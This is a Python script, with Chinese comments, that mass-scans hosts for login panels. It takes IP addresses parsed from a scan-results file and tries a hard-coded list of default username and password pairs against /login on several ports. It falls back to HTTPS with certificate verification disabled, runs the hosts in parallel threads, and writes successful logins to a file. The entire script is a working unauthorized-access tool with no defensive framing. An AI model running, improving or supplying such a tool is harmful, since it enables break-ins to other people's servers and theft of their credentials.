import requests
from concurrent.futures import ThreadPoolExecutor

# 常见的用户名和密码组合
credentials = [
    {'username': 'admin', 'password': 'admin'},
    {'username': 'admin', 'password': '123456'},
    {'username': 'user', 'password': 'password'},
    {'username': 'user', 'password': '123456'},
    {'username': 'guest', 'password': 'guest'},
    {'username': 'root', 'password': 'root'},
    {'username': 'test', 'password': 'test123'},
    # 可以在这里添加更多的用户名和密码组合
]

# 指定的端口
ports = [54321, 12345, 1010, 1111, 62000, 8888, 9999]

def process_ip(ip):
    for port in ports:
        for cred in credentials:
            url = f"http://{ip}:{port}/login"
            try:
                r = requests.post(url, data=cred, timeout=2)
                if r.status_code == 200:
                    try:
                        response_data = r.json()
                        if isinstance(response_data, dict) and response_data.get("success"):
                            print(f"{ip}:{port} Successful with {cred['username']}:{cred['password']}")
                            with open("xui.txt", "a") as result:
                                result.write(f"{ip}:{port} - {cred['username']}:{cred['password']}\n")
                        else:
                            print(f"{ip}:{port} Def")
                    except ValueError:
                        print("Invalid JSON response from:", url)
                else:
                    print(f"{ip}:{port} Def")
            except requests.exceptions.RequestException:
                try:
                    url = f"https://{ip}:{port}/login"
                    r = requests.post(url, data=cred, timeout=2, verify=False)
                    if r.status_code == 200:
                        try:
                            response_data = r.json()
                            if isinstance(response_data, dict) and response_data.get("success"):
                                print(f"{ip}:{port} Successful with {cred['username']}:{cred['password']}")
                                with open("xui.txt", "a") as result:
                                    result.write(f"{ip}:{port} - {cred['username']}:{cred['password']}\n")
                            else:
                                print(f"{ip}:{port} Def")
                        except ValueError:
                            print("Invalid JSON response from:", url)
                    else:
                        print(f"{ip}:{port} Def")
                except requests.exceptions.RequestException:
                    print(f"{ip}:{port} Def")

if __name__ == "__main__":
    with open("results.txt", "r") as file:
        ips = [line.split("Host: ")[1].split(" ")[0] for line in file if len(line.split("Host: ")) >= 2]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ips)
